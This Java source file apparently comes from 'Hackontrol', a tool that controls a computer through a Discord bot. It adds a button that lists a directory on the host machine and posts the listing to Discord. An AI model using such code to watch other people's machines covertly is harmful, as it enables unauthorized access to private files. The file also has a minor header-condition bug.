package com.khopan.hackontrol.panel;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.sendable.ISendable;
import com.khopan.hackontrol.widget.ControlWidget;

import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class FilePanel extends Panel {
	private static final String PANEL_NAME = "file";

	private static final Button BUTTON_LIST_ROOT = ButtonManager.staticButton(ButtonType.SUCCESS, "List Root", "listRoot");

	private static final String PATHNAME_SYSTEM_ROOT = "SYSTEMROOT";

	@Override
	public String panelName() {
		return FilePanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(new File("D:\\GitHub Repository\\Hackontrol"), context.reply()));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(FilePanel.BUTTON_LIST_ROOT)
				.build()
		};
	}

	private void sendFileList(File folder, ISendable sender) {
		File[] files;
		String pathName;

		if(folder == null) {
			files = File.listRoots();
			pathName = FilePanel.PATHNAME_SYSTEM_ROOT;
		} else {
			if(!folder.isDirectory()) {
				folder = folder.getParentFile();
			}

			files = folder.listFiles();
			pathName = folder.getAbsolutePath();
		}

		if(files.length == 1 && files[0].isDirectory()) {
			this.sendFileList(files[0], sender);
			return;
		}

		List<File> fileList = new ArrayList<>();
		List<File> folderList = new ArrayList<>();

		for(File file : files) {
			if(file.isDirectory()) {
				folderList.add(file);
			} else {
				fileList.add(file);
			}
		}

		StringBuilder builder = new StringBuilder();
		builder.append("**");
		builder.append(pathName);
		builder.append("**");
		int index = 0;

		if(!folderList.isEmpty()) {
			builder.append("\n***File***");
		}

		for(File file : fileList) {
			builder.append("\n`");
			builder.append(++index);
			builder.append(") ");
			builder.append(file.getName());
			builder.append('`');
		}

		if(!folderList.isEmpty()) {
			builder.append("\n***Folder***");
		}

		for(File file : folderList) {
			builder.append("\n`");
			builder.append(++index);
			builder.append(") ");
			builder.append(folder == null ? file.getAbsolutePath() : file.getName());
			builder.append('`');
		}

		HackontrolMessage.deletable(sender, builder.toString());
	}
}
